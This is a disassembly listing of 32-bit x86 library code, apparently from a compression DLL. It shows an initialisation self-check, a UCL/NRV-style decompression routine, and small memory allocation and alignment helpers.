1000cd77:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
1000cd7b:	8b 74 24 08          	mov    0x8(%esp),%esi
1000cd7f:	33 c0                	xor    %eax,%eax
1000cd81:	81 f9 02 03 04 05    	cmp    $0x5040302,%ecx
1000cd87:	0f 94 c0             	sete   %al
1000cd8a:	33 c9                	xor    %ecx,%ecx
1000cd8c:	81 fe 01 02 03 04    	cmp    $0x4030201,%esi
1000cd92:	8b 74 24 10          	mov    0x10(%esp),%esi
1000cd96:	0f 94 c1             	sete   %cl
1000cd99:	23 c1                	and    %ecx,%eax
1000cd9b:	33 d2                	xor    %edx,%edx
1000cd9d:	81 fe 03 04 05 06    	cmp    $0x6050403,%esi
1000cda3:	8b 74 24 04          	mov    0x4(%esp),%esi
1000cda7:	0f 94 c2             	sete   %dl
1000cdaa:	23 c2                	and    %edx,%eax
1000cdac:	33 c9                	xor    %ecx,%ecx
1000cdae:	81 fe 00 01 02 03    	cmp    $0x3020100,%esi
1000cdb4:	0f 94 c1             	sete   %cl
1000cdb7:	23 c1                	and    %ecx,%eax
1000cdb9:	83 e0 01             	and    $0x1,%eax
1000cdbc:	8b f0                	mov    %eax,%esi
1000cdbe:	83 e6 01             	and    $0x1,%esi
1000cdc1:	83 fe 01             	cmp    $0x1,%esi
1000cdc4:	75 55                	jne    0x1000ce1b
1000cdc6:	e8 c5 01 00 00       	call   0x1000cf90
1000cdcb:	8b f0                	mov    %eax,%esi
1000cdcd:	f7 de                	neg    %esi
1000cdcf:	1b f6                	sbb    %esi,%esi
1000cdd1:	46                   	inc    %esi
1000cdd2:	83 e6 01             	and    $0x1,%esi
1000cdd5:	83 fe 01             	cmp    $0x1,%esi
1000cdd8:	75 41                	jne    0x1000ce1b
1000cdda:	8b 15 20 07 01 10    	mov    0x10010720,%edx
1000cde0:	33 c0                	xor    %eax,%eax
1000cde2:	85 d2                	test   %edx,%edx
1000cde4:	76 12                	jbe    0x1000cdf8
1000cde6:	b9 44 08 01 10       	mov    $0x10010844,%ecx
1000cdeb:	8d 70 fd             	lea    -0x3(%eax),%esi
1000cdee:	40                   	inc    %eax
1000cdef:	89 31                	mov    %esi,(%ecx)
1000cdf1:	83 c1 04             	add    $0x4,%ecx
1000cdf4:	3b c2                	cmp    %edx,%eax
1000cdf6:	72 f3                	jb     0x1000cdeb
1000cdf8:	68 44 08 01 10       	push   $0x10010844
1000cdfd:	e8 9e 01 00 00       	call   0x1000cfa0
1000ce02:	8b f0                	mov    %eax,%esi
1000ce04:	83 c4 04             	add    $0x4,%esp
1000ce07:	f7 de                	neg    %esi
1000ce09:	1b f6                	sbb    %esi,%esi
1000ce0b:	46                   	inc    %esi
1000ce0c:	83 e6 01             	and    $0x1,%esi
1000ce0f:	83 fe 01             	cmp    $0x1,%esi
1000ce12:	75 07                	jne    0x1000ce1b
1000ce14:	e8 27 00 00 00       	call   0x1000ce40
1000ce19:	23 f0                	and    %eax,%esi
1000ce1b:	8b c6                	mov    %esi,%eax
1000ce1d:	5e                   	pop    %esi
1000ce1e:	48                   	dec    %eax
1000ce1f:	f7 d8                	neg    %eax
1000ce21:	1b c0                	sbb    %eax,%eax
1000ce23:	83 c4 20             	add    $0x20,%esp
1000ce26:	c3                   	ret
1000ce27:	90                   	nop
1000ce28:	90                   	nop
1000ce29:	90                   	nop
1000ce2a:	90                   	nop
1000ce2b:	90                   	nop
1000ce2c:	90                   	nop
1000ce2d:	90                   	nop
1000ce2e:	90                   	nop
1000ce2f:	90                   	nop
1000ce30:	b8 01 00 00 00       	mov    $0x1,%eax
1000ce35:	c3                   	ret
1000ce36:	90                   	nop
1000ce37:	90                   	nop
1000ce38:	90                   	nop
1000ce39:	90                   	nop
1000ce3a:	90                   	nop
1000ce3b:	90                   	nop
1000ce3c:	90                   	nop
1000ce3d:	90                   	nop
1000ce3e:	90                   	nop
1000ce3f:	90                   	nop
1000ce40:	83 ec 3c             	sub    $0x3c,%esp
1000ce43:	33 c0                	xor    %eax,%eax
1000ce45:	88 44 04 00          	mov    %al,0x0(%esp,%eax,1)
1000ce49:	40                   	inc    %eax
1000ce4a:	83 f8 10             	cmp    $0x10,%eax
1000ce4d:	7c f6                	jl     0x1000ce45
1000ce4f:	53                   	push   %ebx
1000ce50:	56                   	push   %esi
1000ce51:	57                   	push   %edi
1000ce52:	8d 44 24 1c          	lea    0x1c(%esp),%eax
1000ce56:	6a 04                	push   $0x4
1000ce58:	50                   	push   %eax
1000ce59:	e8 82 04 00 00       	call   0x1000d2e0
1000ce5e:	8d 54 04 24          	lea    0x24(%esp,%eax,1),%edx
1000ce62:	8d 4c 24 24          	lea    0x24(%esp),%ecx
1000ce66:	8b f2                	mov    %edx,%esi
1000ce68:	83 cf ff             	or     $0xffffffff,%edi
1000ce6b:	83 c4 08             	add    $0x8,%esp
1000ce6e:	2b f1                	sub    %ecx,%esi
1000ce70:	33 c0                	xor    %eax,%eax
1000ce72:	66 81 ff ff ff       	cmp    $0xffff,%di
1000ce77:	0f 94 c0             	sete   %al
1000ce7a:	33 c9                	xor    %ecx,%ecx
1000ce7c:	83 ff ff             	cmp    $0xffffffff,%edi
1000ce7f:	0f 94 c1             	sete   %cl
1000ce82:	23 c1                	and    %ecx,%eax
1000ce84:	33 c9                	xor    %ecx,%ecx
1000ce86:	83 fe 04             	cmp    $0x4,%esi
1000ce89:	0f 9c c1             	setl   %cl
1000ce8c:	23 c1                	and    %ecx,%eax
1000ce8e:	33 c9                	xor    %ecx,%ecx
1000ce90:	85 f6                	test   %esi,%esi
1000ce92:	0f 9d c1             	setge  %cl
1000ce95:	23 c1                	and    %ecx,%eax
1000ce97:	83 e0 01             	and    $0x1,%eax
1000ce9a:	83 f8 01             	cmp    $0x1,%eax
1000ce9d:	75 0b                	jne    0x1000ceaa
1000ce9f:	b9 08 00 00 00       	mov    $0x8,%ecx
1000cea4:	83 e0 01             	and    $0x1,%eax
1000cea7:	49                   	dec    %ecx
1000cea8:	75 fa                	jne    0x1000cea4
1000ceaa:	33 f6                	xor    %esi,%esi
1000ceac:	33 c9                	xor    %ecx,%ecx
1000ceae:	85 f6                	test   %esi,%esi
1000ceb0:	0f 94 c1             	sete   %cl
1000ceb3:	83 e1 01             	and    $0x1,%ecx
1000ceb6:	23 c1                	and    %ecx,%eax
1000ceb8:	83 f8 01             	cmp    $0x1,%eax
1000cebb:	0f 85 be 00 00 00    	jne    0x1000cf7f
1000cec1:	b9 0a 00 00 00       	mov    $0xa,%ecx
1000cec6:	8b c2                	mov    %edx,%eax
1000cec8:	8b fa                	mov    %edx,%edi
1000ceca:	8d 5a 04             	lea    0x4(%edx),%ebx
1000cecd:	f3 ab                	rep stos %eax,%es:(%edi)
1000cecf:	b9 08 00 00 00       	mov    $0x8,%ecx
1000ced4:	33 c0                	xor    %eax,%eax
1000ced6:	8b fb                	mov    %ebx,%edi
1000ced8:	f3 ab                	rep stos %eax,%es:(%edi)
1000ceda:	8b 32                	mov    (%edx),%esi
1000cedc:	8b cb                	mov    %ebx,%ecx
1000cede:	3b f2                	cmp    %edx,%esi
1000cee0:	bf 08 00 00 00       	mov    $0x8,%edi
1000cee5:	0f 94 c0             	sete   %al
1000cee8:	83 e0 01             	and    $0x1,%eax
1000ceeb:	8b f0                	mov    %eax,%esi
1000ceed:	8b 19                	mov    (%ecx),%ebx
1000ceef:	33 c0                	xor    %eax,%eax
1000cef1:	85 db                	test   %ebx,%ebx
1000cef3:	0f 94 c0             	sete   %al
1000cef6:	23 f0                	and    %eax,%esi
1000cef8:	83 c1 04             	add    $0x4,%ecx
1000cefb:	4f                   	dec    %edi
1000cefc:	75 ef                	jne    0x1000ceed
1000cefe:	8b 7a 24             	mov    0x24(%edx),%edi
1000cf01:	33 c9                	xor    %ecx,%ecx
1000cf03:	3b fa                	cmp    %edx,%edi
1000cf05:	0f 94 c1             	sete   %cl
1000cf08:	23 f1                	and    %ecx,%esi
1000cf0a:	83 fe 01             	cmp    $0x1,%esi
1000cf0d:	75 6e                	jne    0x1000cf7d
1000cf0f:	8d 54 24 0d          	lea    0xd(%esp),%edx
1000cf13:	6a 04                	push   $0x4
1000cf15:	52                   	push   %edx
1000cf16:	e8 c5 03 00 00       	call   0x1000d2e0
1000cf1b:	8b c8                	mov    %eax,%ecx
1000cf1d:	83 c4 08             	add    $0x8,%esp
1000cf20:	41                   	inc    %ecx
1000cf21:	8d 74 24 0d          	lea    0xd(%esp),%esi
1000cf25:	8d 54 0c 0c          	lea    0xc(%esp,%ecx,1),%edx
1000cf29:	8b c2                	mov    %edx,%eax
1000cf2b:	24 03                	and    $0x3,%al
1000cf2d:	f6 d8                	neg    %al
1000cf2f:	1b c0                	sbb    %eax,%eax
1000cf31:	40                   	inc    %eax
1000cf32:	3b d6                	cmp    %esi,%edx
1000cf34:	1b f6                	sbb    %esi,%esi
1000cf36:	46                   	inc    %esi
1000cf37:	23 c6                	and    %esi,%eax
1000cf39:	83 f9 05             	cmp    $0x5,%ecx
1000cf3c:	1b f6                	sbb    %esi,%esi
1000cf3e:	f7 de                	neg    %esi
1000cf40:	23 c6                	and    %esi,%eax
1000cf42:	83 f9 01             	cmp    $0x1,%ecx
1000cf45:	1b f6                	sbb    %esi,%esi
1000cf47:	46                   	inc    %esi
1000cf48:	23 c6                	and    %esi,%eax
1000cf4a:	8d 74 24 11          	lea    0x11(%esp),%esi
1000cf4e:	83 e0 01             	and    $0x1,%eax
1000cf51:	3b d6                	cmp    %esi,%edx
1000cf53:	1b f6                	sbb    %esi,%esi
1000cf55:	f7 de                	neg    %esi
1000cf57:	23 c6                	and    %esi,%eax
1000cf59:	83 f8 01             	cmp    $0x1,%eax
1000cf5c:	75 21                	jne    0x1000cf7f
1000cf5e:	8b 7c 0c 10          	mov    0x10(%esp,%ecx,1),%edi
1000cf62:	8b 1a                	mov    (%edx),%ebx
1000cf64:	33 f6                	xor    %esi,%esi
1000cf66:	3b f7                	cmp    %edi,%esi
1000cf68:	5f                   	pop    %edi
1000cf69:	1b c9                	sbb    %ecx,%ecx
1000cf6b:	f7 d9                	neg    %ecx
1000cf6d:	3b f3                	cmp    %ebx,%esi
1000cf6f:	5e                   	pop    %esi
1000cf70:	1b d2                	sbb    %edx,%edx
1000cf72:	5b                   	pop    %ebx
1000cf73:	f7 da                	neg    %edx
1000cf75:	23 ca                	and    %edx,%ecx
1000cf77:	23 c1                	and    %ecx,%eax
1000cf79:	83 c4 3c             	add    $0x3c,%esp
1000cf7c:	c3                   	ret
1000cf7d:	8b c6                	mov    %esi,%eax
1000cf7f:	5f                   	pop    %edi
1000cf80:	5e                   	pop    %esi
1000cf81:	5b                   	pop    %ebx
1000cf82:	83 c4 3c             	add    $0x3c,%esp
1000cf85:	c3                   	ret
1000cf86:	90                   	nop
1000cf87:	90                   	nop
1000cf88:	90                   	nop
1000cf89:	90                   	nop
1000cf8a:	90                   	nop
1000cf8b:	90                   	nop
1000cf8c:	90                   	nop
1000cf8d:	90                   	nop
1000cf8e:	90                   	nop
1000cf8f:	90                   	nop
1000cf90:	33 c0                	xor    %eax,%eax
1000cf92:	c3                   	ret
1000cf93:	90                   	nop
1000cf94:	90                   	nop
1000cf95:	90                   	nop
1000cf96:	90                   	nop
1000cf97:	90                   	nop
1000cf98:	90                   	nop
1000cf99:	90                   	nop
1000cf9a:	90                   	nop
1000cf9b:	90                   	nop
1000cf9c:	90                   	nop
1000cf9d:	90                   	nop
1000cf9e:	90                   	nop
1000cf9f:	90                   	nop
1000cfa0:	8b 44 24 04          	mov    0x4(%esp),%eax
1000cfa4:	83 38 fd             	cmpl   $0xfffffffd,(%eax)
1000cfa7:	75 0f                	jne    0x1000cfb8
1000cfa9:	83 78 04 fe          	cmpl   $0xfffffffe,0x4(%eax)
1000cfad:	75 09                	jne    0x1000cfb8
1000cfaf:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
1000cfb3:	75 03                	jne    0x1000cfb8
1000cfb5:	33 c0                	xor    %eax,%eax
1000cfb7:	c3                   	ret
1000cfb8:	b8 01 00 00 00       	mov    $0x1,%eax
1000cfbd:	c3                   	ret
1000cfbe:	90                   	nop
1000cfbf:	90                   	nop
1000cfc0:	8b 44 24 04          	mov    0x4(%esp),%eax
1000cfc4:	c7 05 50 08 01 10 01 	movl   $0x1,0x10010850
1000cfcb:	00 00 00 
1000cfce:	85 c0                	test   %eax,%eax
1000cfd0:	0f 84 83 00 00 00    	je     0x1000d059
1000cfd6:	8b 44 24 08          	mov    0x8(%esp),%eax
1000cfda:	83 f8 ff             	cmp    $0xffffffff,%eax
1000cfdd:	74 05                	je     0x1000cfe4
1000cfdf:	83 f8 02             	cmp    $0x2,%eax
1000cfe2:	75 75                	jne    0x1000d059
1000cfe4:	8b 44 24 0c          	mov    0xc(%esp),%eax
1000cfe8:	83 f8 ff             	cmp    $0xffffffff,%eax
1000cfeb:	74 05                	je     0x1000cff2
1000cfed:	83 f8 04             	cmp    $0x4,%eax
1000cff0:	75 67                	jne    0x1000d059
1000cff2:	8b 44 24 10          	mov    0x10(%esp),%eax
1000cff6:	83 f8 ff             	cmp    $0xffffffff,%eax
1000cff9:	74 05                	je     0x1000d000
1000cffb:	83 f8 04             	cmp    $0x4,%eax
1000cffe:	75 59                	jne    0x1000d059
1000d000:	8b 44 24 14          	mov    0x14(%esp),%eax
1000d004:	83 f8 ff             	cmp    $0xffffffff,%eax
1000d007:	74 05                	je     0x1000d00e
1000d009:	83 f8 04             	cmp    $0x4,%eax
1000d00c:	75 4b                	jne    0x1000d059
1000d00e:	8b 44 24 18          	mov    0x18(%esp),%eax
1000d012:	83 f8 ff             	cmp    $0xffffffff,%eax
1000d015:	74 05                	je     0x1000d01c
1000d017:	83 f8 04             	cmp    $0x4,%eax
1000d01a:	75 3d                	jne    0x1000d059
1000d01c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
1000d020:	83 f8 ff             	cmp    $0xffffffff,%eax
1000d023:	74 05                	je     0x1000d02a
1000d025:	83 f8 04             	cmp    $0x4,%eax
1000d028:	75 2f                	jne    0x1000d059
1000d02a:	8b 44 24 20          	mov    0x20(%esp),%eax
1000d02e:	83 f8 ff             	cmp    $0xffffffff,%eax
1000d031:	74 05                	je     0x1000d038
1000d033:	83 f8 04             	cmp    $0x4,%eax
1000d036:	75 21                	jne    0x1000d059
1000d038:	8b 44 24 24          	mov    0x24(%esp),%eax
1000d03c:	83 f8 ff             	cmp    $0xffffffff,%eax
1000d03f:	74 05                	je     0x1000d046
1000d041:	83 f8 04             	cmp    $0x4,%eax
1000d044:	75 13                	jne    0x1000d059
1000d046:	8b 44 24 28          	mov    0x28(%esp),%eax
1000d04a:	83 f8 ff             	cmp    $0xffffffff,%eax
1000d04d:	74 05                	je     0x1000d054
1000d04f:	83 f8 04             	cmp    $0x4,%eax
1000d052:	75 05                	jne    0x1000d059
1000d054:	e9 47 fc ff ff       	jmp    0x1000cca0
1000d059:	83 c8 ff             	or     $0xffffffff,%eax
1000d05c:	c3                   	ret
1000d05d:	90                   	nop
1000d05e:	90                   	nop
1000d05f:	90                   	nop
1000d060:	83 ec 08             	sub    $0x8,%esp
1000d063:	53                   	push   %ebx
1000d064:	33 c0                	xor    %eax,%eax
1000d066:	33 c9                	xor    %ecx,%ecx
1000d068:	55                   	push   %ebp
1000d069:	8b 6c 24 14          	mov    0x14(%esp),%ebp
1000d06d:	33 db                	xor    %ebx,%ebx
1000d06f:	56                   	push   %esi
1000d070:	57                   	push   %edi
1000d071:	89 5c 24 10          	mov    %ebx,0x10(%esp)
1000d075:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
1000d07c:	00 
1000d07d:	03 c0                	add    %eax,%eax
1000d07f:	84 c0                	test   %al,%al
1000d081:	74 0a                	je     0x1000d08d
1000d083:	8b d0                	mov    %eax,%edx
1000d085:	c1 ea 08             	shr    $0x8,%edx
1000d088:	83 e2 01             	and    $0x1,%edx
1000d08b:	eb 12                	jmp    0x1000d09f
1000d08d:	33 c0                	xor    %eax,%eax
1000d08f:	8a 04 29             	mov    (%ecx,%ebp,1),%al
1000d092:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
1000d096:	8b d0                	mov    %eax,%edx
1000d098:	c1 ea 08             	shr    $0x8,%edx
1000d09b:	83 e2 01             	and    $0x1,%edx
1000d09e:	41                   	inc    %ecx
1000d09f:	85 d2                	test   %edx,%edx
1000d0a1:	74 12                	je     0x1000d0b5
1000d0a3:	8b 74 24 24          	mov    0x24(%esp),%esi
1000d0a7:	8a 14 29             	mov    (%ecx,%ebp,1),%dl
1000d0aa:	88 14 33             	mov    %dl,(%ebx,%esi,1)
1000d0ad:	43                   	inc    %ebx
1000d0ae:	89 5c 24 10          	mov    %ebx,0x10(%esp)
1000d0b2:	41                   	inc    %ecx
1000d0b3:	eb c8                	jmp    0x1000d07d
1000d0b5:	be 01 00 00 00       	mov    $0x1,%esi
1000d0ba:	8d 14 00             	lea    (%eax,%eax,1),%edx
1000d0bd:	84 d2                	test   %dl,%dl
1000d0bf:	74 0a                	je     0x1000d0cb
1000d0c1:	8b c2                	mov    %edx,%eax
1000d0c3:	c1 e8 08             	shr    $0x8,%eax
1000d0c6:	83 e0 01             	and    $0x1,%eax
1000d0c9:	eb 12                	jmp    0x1000d0dd
1000d0cb:	33 c0                	xor    %eax,%eax
1000d0cd:	8a 04 29             	mov    (%ecx,%ebp,1),%al
1000d0d0:	8d 54 00 01          	lea    0x1(%eax,%eax,1),%edx
1000d0d4:	8b c2                	mov    %edx,%eax
1000d0d6:	c1 e8 08             	shr    $0x8,%eax
1000d0d9:	83 e0 01             	and    $0x1,%eax
1000d0dc:	41                   	inc    %ecx
1000d0dd:	8d 3c 70             	lea    (%eax,%esi,2),%edi
1000d0e0:	8d 04 12             	lea    (%edx,%edx,1),%eax
1000d0e3:	84 c0                	test   %al,%al
1000d0e5:	74 0a                	je     0x1000d0f1
1000d0e7:	8b d0                	mov    %eax,%edx
1000d0e9:	c1 ea 08             	shr    $0x8,%edx
1000d0ec:	83 e2 01             	and    $0x1,%edx
1000d0ef:	eb 12                	jmp    0x1000d103
1000d0f1:	33 d2                	xor    %edx,%edx
1000d0f3:	8a 14 29             	mov    (%ecx,%ebp,1),%dl
1000d0f6:	8d 44 12 01          	lea    0x1(%edx,%edx,1),%eax
1000d0fa:	8b d0                	mov    %eax,%edx
1000d0fc:	c1 ea 08             	shr    $0x8,%edx
1000d0ff:	83 e2 01             	and    $0x1,%edx
1000d102:	41                   	inc    %ecx
1000d103:	85 d2                	test   %edx,%edx
1000d105:	75 2c                	jne    0x1000d133
1000d107:	03 c0                	add    %eax,%eax
1000d109:	84 c0                	test   %al,%al
1000d10b:	74 0e                	je     0x1000d11b
1000d10d:	8b d0                	mov    %eax,%edx
1000d10f:	c1 ea 08             	shr    $0x8,%edx
1000d112:	83 e2 01             	and    $0x1,%edx
1000d115:	8d 74 7a fe          	lea    -0x2(%edx,%edi,2),%esi
1000d119:	eb 9f                	jmp    0x1000d0ba
1000d11b:	33 c0                	xor    %eax,%eax
1000d11d:	8a 04 29             	mov    (%ecx,%ebp,1),%al
1000d120:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
1000d124:	8b d0                	mov    %eax,%edx
1000d126:	c1 ea 08             	shr    $0x8,%edx
1000d129:	83 e2 01             	and    $0x1,%edx
1000d12c:	41                   	inc    %ecx
1000d12d:	8d 74 7a fe          	lea    -0x2(%edx,%edi,2),%esi
1000d131:	eb 87                	jmp    0x1000d0ba
1000d133:	83 ff 02             	cmp    $0x2,%edi
1000d136:	75 28                	jne    0x1000d160
1000d138:	8b 5c 24 14          	mov    0x14(%esp),%ebx
1000d13c:	03 c0                	add    %eax,%eax
1000d13e:	84 c0                	test   %al,%al
1000d140:	74 0a                	je     0x1000d14c
1000d142:	8b d0                	mov    %eax,%edx
1000d144:	c1 ea 08             	shr    $0x8,%edx
1000d147:	83 e2 01             	and    $0x1,%edx
1000d14a:	eb 40                	jmp    0x1000d18c
1000d14c:	33 d2                	xor    %edx,%edx
1000d14e:	8a 14 29             	mov    (%ecx,%ebp,1),%dl
1000d151:	8d 44 12 01          	lea    0x1(%edx,%edx,1),%eax
1000d155:	8b d0                	mov    %eax,%edx
1000d157:	c1 ea 08             	shr    $0x8,%edx
1000d15a:	83 e2 01             	and    $0x1,%edx
1000d15d:	41                   	inc    %ecx
1000d15e:	eb 2c                	jmp    0x1000d18c
1000d160:	33 d2                	xor    %edx,%edx
1000d162:	81 c7 fd ff ff 00    	add    $0xfffffd,%edi
1000d168:	8a 14 29             	mov    (%ecx,%ebp,1),%dl
1000d16b:	8b f2                	mov    %edx,%esi
1000d16d:	c1 e7 08             	shl    $0x8,%edi
1000d170:	03 f7                	add    %edi,%esi
1000d172:	41                   	inc    %ecx
1000d173:	83 fe ff             	cmp    $0xffffffff,%esi
1000d176:	0f 84 c8 00 00 00    	je     0x1000d244
1000d17c:	8b d6                	mov    %esi,%edx
1000d17e:	f7 d2                	not    %edx
1000d180:	d1 ee                	shr    $1,%esi
1000d182:	83 e2 01             	and    $0x1,%edx
1000d185:	46                   	inc    %esi
1000d186:	8b de                	mov    %esi,%ebx
1000d188:	89 5c 24 14          	mov    %ebx,0x14(%esp)
1000d18c:	03 c0                	add    %eax,%eax
1000d18e:	84 c0                	test   %al,%al
1000d190:	74 0a                	je     0x1000d19c
1000d192:	8b f0                	mov    %eax,%esi
1000d194:	c1 ee 08             	shr    $0x8,%esi
1000d197:	83 e6 01             	and    $0x1,%esi
1000d19a:	eb 12                	jmp    0x1000d1ae
1000d19c:	33 c0                	xor    %eax,%eax
1000d19e:	8a 04 29             	mov    (%ecx,%ebp,1),%al
1000d1a1:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
1000d1a5:	8b f0                	mov    %eax,%esi
1000d1a7:	c1 ee 08             	shr    $0x8,%esi
1000d1aa:	83 e6 01             	and    $0x1,%esi
1000d1ad:	41                   	inc    %ecx
1000d1ae:	8d 3c 56             	lea    (%esi,%edx,2),%edi
1000d1b1:	85 ff                	test   %edi,%edi
1000d1b3:	75 51                	jne    0x1000d206
1000d1b5:	47                   	inc    %edi
1000d1b6:	8d 14 00             	lea    (%eax,%eax,1),%edx
1000d1b9:	84 d2                	test   %dl,%dl
1000d1bb:	74 0a                	je     0x1000d1c7
1000d1bd:	8b c2                	mov    %edx,%eax
1000d1bf:	c1 e8 08             	shr    $0x8,%eax
1000d1c2:	83 e0 01             	and    $0x1,%eax
1000d1c5:	eb 12                	jmp    0x1000d1d9
1000d1c7:	33 d2                	xor    %edx,%edx
1000d1c9:	8a 14 29             	mov    (%ecx,%ebp,1),%dl
1000d1cc:	8d 54 12 01          	lea    0x1(%edx,%edx,1),%edx
1000d1d0:	8b c2                	mov    %edx,%eax
1000d1d2:	c1 e8 08             	shr    $0x8,%eax
1000d1d5:	83 e0 01             	and    $0x1,%eax
1000d1d8:	41                   	inc    %ecx
1000d1d9:	8d 3c 78             	lea    (%eax,%edi,2),%edi
1000d1dc:	8d 04 12             	lea    (%edx,%edx,1),%eax
1000d1df:	84 c0                	test   %al,%al
1000d1e1:	74 0a                	je     0x1000d1ed
1000d1e3:	8b d0                	mov    %eax,%edx
1000d1e5:	c1 ea 08             	shr    $0x8,%edx
1000d1e8:	83 e2 01             	and    $0x1,%edx
1000d1eb:	eb 12                	jmp    0x1000d1ff
1000d1ed:	33 c0                	xor    %eax,%eax
1000d1ef:	8a 04 29             	mov    (%ecx,%ebp,1),%al
1000d1f2:	8d 44 00 01          	lea    0x1(%eax,%eax,1),%eax
1000d1f6:	8b d0                	mov    %eax,%edx
1000d1f8:	c1 ea 08             	shr    $0x8,%edx
1000d1fb:	83 e2 01             	and    $0x1,%edx
1000d1fe:	41                   	inc    %ecx
1000d1ff:	85 d2                	test   %edx,%edx
1000d201:	74 b3                	je     0x1000d1b6
1000d203:	83 c7 02             	add    $0x2,%edi
1000d206:	8b 6c 24 10          	mov    0x10(%esp),%ebp
1000d20a:	ba 00 05 00 00       	mov    $0x500,%edx
1000d20f:	3b d3                	cmp    %ebx,%edx
1000d211:	8b f5                	mov    %ebp,%esi
1000d213:	1b d2                	sbb    %edx,%edx
1000d215:	2b f3                	sub    %ebx,%esi
1000d217:	f7 da                	neg    %edx
1000d219:	03 fa                	add    %edx,%edi
1000d21b:	8b 54 24 24          	mov    0x24(%esp),%edx
1000d21f:	03 f2                	add    %edx,%esi
1000d221:	45                   	inc    %ebp
1000d222:	8a 1e                	mov    (%esi),%bl
1000d224:	46                   	inc    %esi
1000d225:	88 5c 2a ff          	mov    %bl,-0x1(%edx,%ebp,1)
1000d229:	8a 1e                	mov    (%esi),%bl
1000d22b:	88 1c 2a             	mov    %bl,(%edx,%ebp,1)
1000d22e:	45                   	inc    %ebp
1000d22f:	46                   	inc    %esi
1000d230:	4f                   	dec    %edi
1000d231:	75 f6                	jne    0x1000d229
1000d233:	89 6c 24 10          	mov    %ebp,0x10(%esp)
1000d237:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
1000d23b:	8b 5c 24 10          	mov    0x10(%esp),%ebx
1000d23f:	e9 39 fe ff ff       	jmp    0x1000d07d
1000d244:	8b 44 24 28          	mov    0x28(%esp),%eax
1000d248:	5f                   	pop    %edi
1000d249:	5e                   	pop    %esi
1000d24a:	5d                   	pop    %ebp
1000d24b:	89 18                	mov    %ebx,(%eax)
1000d24d:	8b 44 24 14          	mov    0x14(%esp),%eax
1000d251:	3b c8                	cmp    %eax,%ecx
1000d253:	5b                   	pop    %ebx
1000d254:	75 06                	jne    0x1000d25c
1000d256:	33 c0                	xor    %eax,%eax
1000d258:	83 c4 08             	add    $0x8,%esp
1000d25b:	c3                   	ret
1000d25c:	1b c0                	sbb    %eax,%eax
1000d25e:	24 fc                	and    $0xfc,%al
1000d260:	05 37 ff ff ff       	add    $0xffffff37,%eax
1000d265:	83 c4 08             	add    $0x8,%esp
1000d268:	c3                   	ret
1000d269:	90                   	nop
1000d26a:	90                   	nop
1000d26b:	90                   	nop
1000d26c:	90                   	nop
1000d26d:	90                   	nop
1000d26e:	90                   	nop
1000d26f:	90                   	nop
1000d270:	8b 54 24 04          	mov    0x4(%esp),%edx
1000d274:	56                   	push   %esi
1000d275:	8b 74 24 0c          	mov    0xc(%esp),%esi
1000d279:	8b ca                	mov    %edx,%ecx
1000d27b:	33 c0                	xor    %eax,%eax
1000d27d:	0f af ce             	imul   %esi,%ecx
1000d280:	85 d2                	test   %edx,%edx
1000d282:	76 1d                	jbe    0x1000d2a1
1000d284:	85 f6                	test   %esi,%esi
1000d286:	76 19                	jbe    0x1000d2a1
1000d288:	3b ca                	cmp    %edx,%ecx
1000d28a:	72 15                	jb     0x1000d2a1
1000d28c:	3b ce                	cmp    %esi,%ecx
1000d28e:	72 11                	jb     0x1000d2a1
1000d290:	83 f9 ff             	cmp    $0xffffffff,%ecx
1000d293:	73 0e                	jae    0x1000d2a3
1000d295:	51                   	push   %ecx
1000d296:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
1000d29c:	83 c4 04             	add    $0x4,%esp
1000d29f:	5e                   	pop    %esi
1000d2a0:	c3                   	ret
1000d2a1:	33 c0                	xor    %eax,%eax
1000d2a3:	5e                   	pop    %esi
1000d2a4:	c3                   	ret
1000d2a5:	90                   	nop
1000d2a6:	90                   	nop
1000d2a7:	90                   	nop
1000d2a8:	90                   	nop
1000d2a9:	90                   	nop
1000d2aa:	90                   	nop
1000d2ab:	90                   	nop
1000d2ac:	90                   	nop
1000d2ad:	90                   	nop
1000d2ae:	90                   	nop
1000d2af:	90                   	nop
1000d2b0:	8b 44 24 04          	mov    0x4(%esp),%eax
1000d2b4:	85 c0                	test   %eax,%eax
1000d2b6:	74 08                	je     0x1000d2c0
1000d2b8:	50                   	push   %eax
1000d2b9:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000d2bf:	59                   	pop    %ecx
1000d2c0:	c3                   	ret
1000d2c1:	90                   	nop
1000d2c2:	90                   	nop
1000d2c3:	90                   	nop
1000d2c4:	90                   	nop
1000d2c5:	90                   	nop
1000d2c6:	90                   	nop
1000d2c7:	90                   	nop
1000d2c8:	90                   	nop
1000d2c9:	90                   	nop
1000d2ca:	90                   	nop
1000d2cb:	90                   	nop
1000d2cc:	90                   	nop
1000d2cd:	90                   	nop
1000d2ce:	90                   	nop
1000d2cf:	90                   	nop
1000d2d0:	8b 44 24 04          	mov    0x4(%esp),%eax
1000d2d4:	c3                   	ret
1000d2d5:	90                   	nop
1000d2d6:	90                   	nop
1000d2d7:	90                   	nop
1000d2d8:	90                   	nop
1000d2d9:	90                   	nop
1000d2da:	90                   	nop
1000d2db:	90                   	nop
1000d2dc:	90                   	nop
1000d2dd:	90                   	nop
1000d2de:	90                   	nop
1000d2df:	90                   	nop
1000d2e0:	8b 44 24 04          	mov    0x4(%esp),%eax
1000d2e4:	56                   	push   %esi
1000d2e5:	50                   	push   %eax
1000d2e6:	e8 e5 ff ff ff       	call   0x1000d2d0
1000d2eb:	8b 74 24 10          	mov    0x10(%esp),%esi
1000d2ef:	8b c8                	mov    %eax,%ecx
1000d2f1:	33 d2                	xor    %edx,%edx
1000d2f3:	83 c4 04             	add    $0x4,%esp
1000d2f6:	8d 44 31 ff          	lea    -0x1(%ecx,%esi,1),%eax
1000d2fa:	f7 f6                	div    %esi
1000d2fc:	0f af c6             	imul   %esi,%eax
1000d2ff:	2b c1                	sub    %ecx,%eax
1000d301:	5e                   	pop    %esi
1000d302:	c3                   	ret
1000d303:	90                   	nop
1000d304:	90                   	nop
1000d305:	90                   	nop
1000d306:	90                   	nop
1000d307:	90                   	nop
1000d308:	90                   	nop
1000d309:	90                   	nop
1000d30a:	90                   	nop
